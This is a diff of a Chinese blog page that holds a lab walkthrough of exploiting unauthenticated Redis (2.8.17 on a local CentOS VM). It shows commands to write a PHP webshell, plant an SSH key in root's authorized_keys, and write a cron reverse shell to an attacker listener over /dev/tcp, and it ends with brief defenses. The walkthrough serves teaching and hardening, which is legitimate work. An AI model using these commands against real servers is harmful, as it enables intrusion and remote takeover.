@@ -278,7 +278,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>2.1k</span>
+              <span>2k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -298,42 +298,46 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（默认为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据，攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作。</p>
-<p>影响版本：Redis 2.x，3.x，4.x，5.x。但是在Redis3.2之后增加了<strong>protected-mode</strong>安全模式，默认开启，且绑定了本地IP</p>
+        <h3 id="前言">前言</h3>
+<p>Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis
+服务暴露到公网上，如果在没有设置密码认证（默认为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问
+Redis 以及读取 Redis 的数据，攻击者在未授权访问 Redis 的情况下，利用
+Redis 自身的提供的config 命令，可以进行写文件操作。</p>
+<p>影响版本：Redis
+2.x，3.x，4.x，5.x。但是在Redis3.2之后增加了<strong>protected-mode</strong>安全模式，默认开启，且绑定了本地IP</p>
 <p>所以想要复现需要更改配置</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bind 127.0.0.1 =&gt; bind 0.0.0.0  //开启远程访问</span><br><span class="line">protected-mode yes =&gt; protested-mode no</span><br></pre></td></tr></table></figure>
-
 <p>为了方便选择使用3.2版本之前的Redis：Redis-2.8.17，不需要修改配置文件即可复现</p>
-<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>centos7 （192.168.0.182）</p>
+<h3 id="环境搭建">环境搭建</h3>
+<p>centos7 （192.168.0.182）</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 下载redis-2.8.17</span><br><span class="line">wget http://download.redis.io/releases/redis-2.8.17.tar.gz</span><br><span class="line"></span><br><span class="line"># 解压压缩包 编译安装</span><br><span class="line">tar xzf redis-2.8.17.tar.gz</span><br><span class="line">cd redis-2.8.17</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"># redis.conf拷贝到/etc下面</span><br><span class="line">cp redis.conf /etc/redis.conf</span><br><span class="line"></span><br><span class="line"># 将redis-server和redis-cli拷贝到/usr/bin目录下，方便直接启动redis服务器</span><br><span class="line">cd src</span><br><span class="line">cp redis-server /usr/bin</span><br><span class="line">cp redis-cli /usr/bin</span><br><span class="line"></span><br><span class="line"># 启动服务</span><br><span class="line">redis-server /etc/redis.conf</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 由于是在本地搭建的，没有开启6379端口对外开放，所有先在centos上先关闭防火墙 </span><br><span class="line">systemctl stop firewalld.service</span><br><span class="line">systemctl disable firewalld.service</span><br><span class="line">systemctl status firewalld.service</span><br></pre></td></tr></table></figure>
-
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用kali远程连接redis</p>
+<h3 id="漏洞利用">漏洞利用</h3>
+<p>使用kali远程连接redis</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.163.132</span><br></pre></td></tr></table></figure>
-
-<h4 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h4><p>条件</p>
+<h4 id="写入webshell">写入webshell</h4>
+<p>条件</p>
 <ul>
 <li>成功连接redis服务器</li>
 <li>知道web根目录的绝对路径</li>
 <li>redis服务器用户有写入权限</li>
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">192.168.0.182:6379&gt; set webshell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-
 <p><img src="/posts/19a78c2/shell.png"></p>
-<h4 id="写入ssh公钥远程连接"><a href="#写入ssh公钥远程连接" class="headerlink" title="写入ssh公钥远程连接"></a>写入ssh公钥远程连接</h4><p>1.kali 本地生成ssh公钥</p>
+<h4 id="写入ssh公钥远程连接">写入ssh公钥远程连接</h4>
+<p>1.kali 本地生成ssh公钥</p>
 <p><code>ssh-keygen -t rsa</code></p>
 <p>2.进入.ssh目录，将公钥写入1.txt</p>
 <p><code>cd /root/.ssh</code></p>
-<p><code>(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; 1.txt</code></p>
+<p><code>(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") &gt; 1.txt</code></p>
 <p><img src="/posts/19a78c2/1_txt.png"></p>
 <p>3.将1.txt写入靶机</p>
-<p><code> cat 1.txt | redis-cli -h 192.168.0.182 -x set crack</code></p>
+<p><code>cat 1.txt | redis-cli -h 192.168.0.182 -x set crack</code></p>
 <p>4.远程登录靶机redis服务</p>
 <p><code>redis-cli -h 192.168.0.182</code></p>
 <p>5.更改redis备份路径为ssh公钥存放目录（一般默认为/root/.ssh）,设置上传公钥的备份文件名字为authorized_keys，save保存</p>
 <p><code>CONFIG GET dir</code></p>
-<p><code>config set dir /root/.ssh</code> </p>
+<p><code>config set dir /root/.ssh</code></p>
 <p><code>CONFIG SET dbfilename authorized_keys</code></p>
 <p><code>CONFIG GET dbfilename</code> 检查是否有authorized_keys文件</p>
 <p><code>save</code></p>
@@ -342,28 +346,27 @@
 <p><code>ssh -i id_rsa root@192.168.0.182</code></p>
 <p>登录成功</p>
 <p><img src="/posts/19a78c2/ssh_conn.png"></p>
-<h4 id="利用crontab反弹shell"><a href="#利用crontab反弹shell" class="headerlink" title="利用crontab反弹shell"></a>利用crontab反弹shell</h4><p>kali使用nc监听端口</p>
+<h4 id="利用crontab反弹shell">利用crontab反弹shell</h4>
+<p>kali使用nc监听端口</p>
 <p><code>nc -lvvp 5555</code></p>
 <p>kali连接redis服务</p>
 <p><code>redis-cli -h 192.168.0.182</code></p>
 <p>向服务器写入文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.0.128/5555 0&gt;&amp;1\n\n&quot;</span><br><span class="line">config set dir /var/spool/cron</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-
 <p>查看nc 是否反弹到shell</p>
 <p><img src="/posts/19a78c2/nc_shell.png"></p>
-<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ul>
-<li><p>禁用高危命令，如远程修改 DB 文件地址</p>
-</li>
-<li><p>选择使用地权限运行redis服务，且禁止远程登录</p>
-</li>
-<li><p>设置Redis服务密码，或是绑定本地IP：127.0.0.1</p>
-</li>
+<h3 id="防御">防御</h3>
+<ul>
+<li><p>禁用高危命令，如远程修改 DB 文件地址</p></li>
+<li><p>选择使用地权限运行redis服务，且禁止远程登录</p></li>
+<li><p>设置Redis服务密码，或是绑定本地IP：127.0.0.1</p></li>
 </ul>
-<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
-<p><a target="_blank" rel="noopener" href="http://www.feidao.site/wordpress/?p=2090">www.feidao.site/wordpress/?p=2090</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/248207.html">https://www.freebuf.com/vuls/248207.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/223432.html">https://www.freebuf.com/vuls/223432.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.yyxzz.net/articles/36.html">https://www.yyxzz.net/articles/36.html</a></p>
+<h3 id="reference">Reference</h3>
+<blockquote>
+<p>www.feidao.site/wordpress/?p=2090</p>
+<p>https://www.freebuf.com/vuls/248207.html</p>
+<p>https://www.freebuf.com/vuls/223432.html</p>
+<p>https://www.yyxzz.net/articles/36.html</p>
 </blockquote>
 
     </div>
@@ -494,7 +497,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%99%E5%85%A5webshell"><span class="nav-number">3.1.</span> <span class="nav-text">写入webshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%99%E5%85%A5ssh%E5%85%AC%E9%92%A5%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5"><span class="nav-number">3.2.</span> <span class="nav-text">写入ssh公钥远程连接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8crontab%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">3.3.</span> <span class="nav-text">利用crontab反弹shell</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1"><span class="nav-number">4.</span> <span class="nav-text">防御</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reference"><span class="nav-number">5.</span> <span class="nav-text">Reference</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%99%E5%85%A5webshell"><span class="nav-number">3.1.</span> <span class="nav-text">写入webshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%99%E5%85%A5ssh%E5%85%AC%E9%92%A5%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5"><span class="nav-number">3.2.</span> <span class="nav-text">写入ssh公钥远程连接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8crontab%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">3.3.</span> <span class="nav-text">利用crontab反弹shell</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1"><span class="nav-number">4.</span> <span class="nav-text">防御</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#reference"><span class="nav-number">5.</span> <span class="nav-text">Reference</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -510,7 +513,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -558,7 +561,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -572,7 +575,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -583,7 +586,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -723,6 +726,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
